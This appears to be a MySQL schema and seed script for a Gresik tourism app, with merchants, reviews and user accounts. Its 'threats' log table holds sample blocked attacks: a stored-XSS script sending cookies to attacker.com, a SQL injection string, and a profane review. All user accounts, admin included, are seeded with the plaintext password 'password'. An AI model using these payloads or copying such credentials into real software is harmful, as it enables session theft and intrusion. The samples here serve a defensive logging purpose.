-- ==========================================================================
-- Grestrip Database Bootstrap Schema & Initial Seed Data
-- MySQL Compatible SQL Script
-- ==========================================================================

-- Create Database if not exists
CREATE DATABASE IF NOT EXISTS `grestrip_db` CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;
USE `grestrip_db`;

-- --------------------------------------------------------------------------
-- 1. Table Structure for `merchants`
-- --------------------------------------------------------------------------
DROP TABLE IF EXISTS `merchants`;
CREATE TABLE `merchants` (
    `id` VARCHAR(50) NOT NULL PRIMARY KEY,
    `name` VARCHAR(255) NOT NULL,
    `owner` VARCHAR(255) NOT NULL,
    `type` VARCHAR(50) NOT NULL,
    `description` TEXT NULL,
    `coords_lat` DOUBLE NOT NULL,
    `coords_lng` DOUBLE NOT NULL,
    `rating` FLOAT DEFAULT 5.0,
    `reviewsCount` INT DEFAULT 0,
    `catalog` TEXT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- Seed Data for `merchants`
INSERT INTO `merchants` (`id`, `name`, `owner`, `type`, `description`, `coords_lat`, `coords_lng`, `rating`, `reviewsCount`, `catalog`) VALUES
('m1', 'Nasi Krawu Bu Azza', 'Ibu Azza', 'kuliner', 'Nasi Krawu legendaris khas Gresik dengan suwiran daging sapi empuk, serundeng manis pedas, dan sambal petis super nikmat.', -7.1610, 112.6565, 4.8, 3, '[{"id":"c1_1","name":"Nasi Krawu Daging","price":20000,"description":"Nasi pulen hangat disajikan di atas daun pisang dengan suwiran daging sapi gurih."},{"id":"c1_2","name":"Nasi Krawu Babat Paru","price":22000,"description":"Kombinasi babat dan paru goreng bumbu rempah melimpah."},{"id":"c1_3","name":"Es Sinom Khas Gresik","price":5000,"description":"Minuman herbal segar dari daun asam muda dan kunyit asli."}]'),
('m2', 'Otak-otak Bandeng Pak Elan II', 'Pak Elan', 'kuliner', 'Bandeng tanpa duri legendaris yang dibakar sempurna dengan isian daging bandeng cincang berbumbu rahasia warisan leluhur.', -7.1642, 112.6450, 4.7, 2, '[{"id":"c2_1","name":"Otak-otak Bandeng Bakar (Utuh)","price":65000,"description":"Satu ekor bandeng utuh tanpa duri isi otak-otak panggang wangi."},{"id":"c2_2","name":"Bandeng Asap Khas Gresik","price":70000,"description":"Bandeng asap wangi gurih, oleh-oleh favorit nomor satu."}]'),
('m3', 'Warung Kopi Amak (Kopi Kasar)', 'Cak Amak', 'kuliner', 'Tempat nongkrong ikonik Gresik yang menyajikan kopi tubruk kasar khas, diseduh langsung dari biji kopi robusta pilihan.', -7.1585, 112.6520, 4.6, 2, '[{"id":"c3_1","name":"Kopi Kasar Cangkir","price":4000,"description":"Kopi robusta tubruk dengan ampas kasar yang bisa diseruput nikmat."},{"id":"c3_2","name":"Kopi Susu Kasar","price":6000,"description":"Kopi kasar dipadukan dengan kental manis gurih."}]'),
('m4', 'Situs Sejarah Giri Kedaton', 'Pengelola Dinas Pariwisata', 'wisata', 'Situs arkeologi pusat kerajaan Islam pertama di Jawa yang didirikan oleh Sunan Giri, menawarkan panorama kota Gresik dari atas bukit.', -7.1812, 112.6322, 4.9, 1, '[{"id":"c4_1","name":"Tiket Masuk Domestik","price":5000,"description":"Akses ke situs cagar budaya Giri Kedaton."},{"id":"c4_2","name":"Pemandu Sejarah Lokal","price":50000,"description":"Tur edukasi sejarah kerajaan Islam Giri Kedaton selama 1 jam."}]'),
('m5', 'Pantai Pasir Putih Dalegan', 'Kelompok Sadar Wisata Dalegan', 'wisata', 'Pantai pasir putih dengan ombak yang tenang dan sangat aman untuk rekreasi keluarga serta wahana air di ujung utara Gresik.', -6.9015, 112.5020, 4.5, 1, '[{"id":"c5_1","name":"Tiket Masuk Pantai","price":10000,"description":"Tiket terusan rekreasi area pantai pasir putih."},{"id":"c5_2","name":"Sewa Gazebo Pantai","price":25000,"description":"Sewa saung santai di pinggir pantai durasi sepuasnya."}]');

-- --------------------------------------------------------------------------
-- 2. Table Structure for `reviews`
-- --------------------------------------------------------------------------
DROP TABLE IF EXISTS `reviews`;
CREATE TABLE `reviews` (
    `id` VARCHAR(50) NOT NULL PRIMARY KEY,
    `merchantId` VARCHAR(50) NOT NULL,
    `userName` VARCHAR(255) NOT NULL,
    `rating` INT NOT NULL,
    `text` TEXT NULL,
    `timestamp` VARCHAR(100) NOT NULL,
    FOREIGN KEY (`merchantId`) REFERENCES `merchants`(`id`) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- Seed Data for `reviews`
INSERT INTO `reviews` (`id`, `merchantId`, `userName`, `rating`, `text`, `timestamp`) VALUES
('r1', 'm1', 'Ahmad_Tour', 5, 'Nasi krawunya enak sekali! Dagingnya empuk dan serundengnya manis pas. Wajib coba bagi wisatawan.', '2026-05-20T10:15:30Z'),
('r2', 'm1', 'Budi Santoso', 4, 'Rasa hidangan disukai 90%, pelayanan dinilai agak sedikit lambat saat jam makan siang padat.', '2026-05-21T12:00:00Z'),
('r3', 'm1', 'Lia_Traveler', 5, 'Sambalnya mantap betul! Tempatnya bersih dan pelayanannya ramah.', '2026-05-22T08:30:00Z'),
('r4', 'm2', 'Roni_Kuliner', 5, 'Otak-otaknya tiada tanding. Rasa bumbu bandengnya meresap sampai ke dalam, dagingnya tebal.', '2026-05-23T14:45:00Z'),
('r5', 'm2', 'Santi Kartika', 4, 'Sangat lezat, namun sayangnya tempat parkir roda empat agak terbatas.', '2026-05-24T17:10:00Z'),
('r6', 'm3', 'WarkopLover', 5, 'Kopi kasar terbaik se-Gresik. Aromanya kuat dan rasanya sangat autentik merakyat.', '2026-05-23T20:00:00Z'),
('r7', 'm3', 'Mega Prasetya', 4, 'Tempat nongkrong yang asik buat ngobrol santai sambil ngopi kasar malam hari.', '2026-05-24T22:30:00Z'),
('r8', 'm4', 'SejarahLover', 5, 'Situs bersejarah yang sangat terawat. Pemandangannya indah dari bukit Giri.', '2026-05-25T09:00:00Z'),
('r9', 'm5', 'KeluargaCeria', 5, 'Pasir putihnya bersih, ombaknya bersahabat untuk anak-anak bermain air.', '2026-05-25T11:45:00Z');

-- --------------------------------------------------------------------------
-- 3. Table Structure for `threats`
-- --------------------------------------------------------------------------
DROP TABLE IF EXISTS `threats`;
CREATE TABLE `threats` (
    `id` VARCHAR(50) NOT NULL PRIMARY KEY,
    `ip` VARCHAR(100) NOT NULL,
    `timestamp` VARCHAR(100) NOT NULL,
    `type` VARCHAR(100) NOT NULL,
    `payload` TEXT NULL,
    `severity` VARCHAR(50) NOT NULL,
    `action` VARCHAR(50) DEFAULT 'BLOCKED'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- Seed Data for `threats`
INSERT INTO `threats` (`id`, `ip`, `timestamp`, `type`, `payload`, `severity`, `action`) VALUES
('t1', '103.45.12.89', '2026-05-25T14:22:10Z', 'Stored XSS', '<script>fetch(\'http://attacker.com/steal?cookie=\'+document.cookie)</script>', 'HIGH', 'BLOCKED'),
('t2', '182.253.90.11', '2026-05-25T16:45:33Z', 'SQL Injection', '\' OR \'1\'=\'1\' --', 'HIGH', 'BLOCKED'),
('t3', '114.79.2.45', '2026-05-26T02:11:05Z', 'Cyberbullying / Profanity', 'Warung bangsat pelayanan kayak tahi babi!', 'MEDIUM', 'BLOCKED');

-- --------------------------------------------------------------------------
-- 4. Table Structure for `itinerary_cache`
-- --------------------------------------------------------------------------
DROP TABLE IF EXISTS `itinerary_cache`;
CREATE TABLE `itinerary_cache` (
    `hash_key` VARCHAR(64) NOT NULL PRIMARY KEY,
    `expiry` VARCHAR(100) NOT NULL,
    `value` LONGTEXT NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------------------------
-- 5. Table Structure for `users`
-- --------------------------------------------------------------------------
DROP TABLE IF EXISTS `users`;
CREATE TABLE `users` (
    `username` VARCHAR(50) NOT NULL PRIMARY KEY,
    `password` VARCHAR(255) NOT NULL,
    `role` VARCHAR(50) NOT NULL,
    `fullname` VARCHAR(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- Seed Data for `users`
INSERT INTO `users` (`username`, `password`, `role`, `fullname`) VALUES
('wisatawan', 'password', 'wisatawan', 'Budi Wisatawan'),
('umkm', 'password', 'umkm', 'Haji Azza (Pemilik UMKM)'),
('itsec', 'password', 'itsec', 'Satria IT Cybersec'),
('admin', 'password', 'superadmin', 'Dinas Pariwisata Gresik');
